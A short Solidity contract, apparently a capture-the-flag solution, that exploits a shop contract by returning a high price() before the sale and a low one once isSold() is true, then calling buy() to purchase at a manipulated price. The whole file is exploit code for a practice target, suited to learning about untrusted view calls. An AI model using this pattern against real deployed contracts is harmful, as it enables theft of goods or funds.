// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

  interface IShop {
    function buy() external;
    function price() external view returns (uint256);
    function isSold() external view returns (bool);
  }

  contract BuyMAXXXXER {

      IShop public shop;

      constructor(address _shop) {
        shop = IShop(_shop);
      }

      function price() external view returns (uint256) {
        if (shop.isSold()) {
          return 1;
        }
        return 100;
      }

      function ATTAAACKKK() external {
        shop.buy();
      }
    }
